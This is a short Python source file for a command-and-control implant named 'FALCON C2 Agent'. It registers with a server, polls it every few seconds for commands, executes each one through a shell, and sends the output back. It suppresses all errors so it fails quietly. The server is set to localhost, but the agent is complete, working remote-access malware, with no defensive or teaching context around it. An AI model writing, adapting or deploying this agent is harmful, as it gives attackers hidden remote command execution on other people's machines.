# FALCON C2 Agent (Python)
import requests, subprocess, time, os
SERVER = "http://127.0.0.1:5000"
CLIENT_ID = os.urandom(4).hex()

def register():
    try: requests.get(f"{SERVER}/api/web_c2/register?id={CLIENT_ID}", timeout=5)
    except: pass

def get_cmd():
    try:
        r = requests.get(f"{SERVER}/api/web_c2/get_cmd?id={CLIENT_ID}", timeout=5)
        return r.text.strip()
    except: return ""

def send_result(res):
    try: requests.post(f"{SERVER}/api/web_c2/send_result", json={"id": CLIENT_ID, "result": res}, timeout=5)
    except: pass

register()
while True:
    cmd = get_cmd()
    if cmd and cmd != "NONE":
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode("utf-8", errors="ignore")
        except Exception as e: out = str(e)
        send_result(out)
    time.sleep(3)
